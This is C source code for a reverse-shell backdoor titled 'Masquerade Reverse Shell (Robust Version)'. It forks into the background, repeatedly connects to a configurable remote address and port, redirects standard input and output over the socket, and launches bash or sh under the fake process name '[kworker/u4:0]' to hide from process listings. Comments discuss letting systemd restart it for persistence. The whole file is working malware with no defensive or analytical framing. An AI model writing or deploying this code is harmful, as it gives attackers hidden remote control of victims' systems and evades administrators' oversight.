/*
 * Masquerade Reverse Shell (Robust Version)
 * 
 * Improvements:
 * - Retry logic for connection (5 tries).
 * - Fallback to /bin/sh if /bin/bash fails.
 * - Proper process naming to avoid suspicious "[kworker...]" in some views if execve fails.
 */

#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

// Placeholders
#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 4444
#define FAKE_NAME "[kworker/u4:0]"

void try_connect() {
    struct sockaddr_in sa;
    int s;
    int retries = 0;

    while (1) {
        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            sleep(5);
            continue;
        }

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
        sa.sin_port = htons(REMOTE_PORT);

        if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
            // Connected!
            break;
        }
        
        close(s);
        sleep(5); // Wait 5s before retry
        // In persistence mode, we might want to loop forever or exit to let systemd restart us.
        // For simple C binary, let's retry a few times then exit (so init system restarts us properly)
        retries++;
        if (retries > 10) exit(1); 
    }

    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    // Try Bash first
    char *args[] = {FAKE_NAME, "-p", "-i", NULL};
    execve("/bin/bash", args, NULL);
    
    // Fallback to Sh if Bash fails
    execve("/bin/sh", args, NULL);
}

int main(int argc, char *argv[]) {
    // Daemonize essentially
    pid_t pid = fork();
    if (pid > 0) return 0;
    if (pid < 0) return 1;
    setsid();

    try_connect();
    return 0;
}
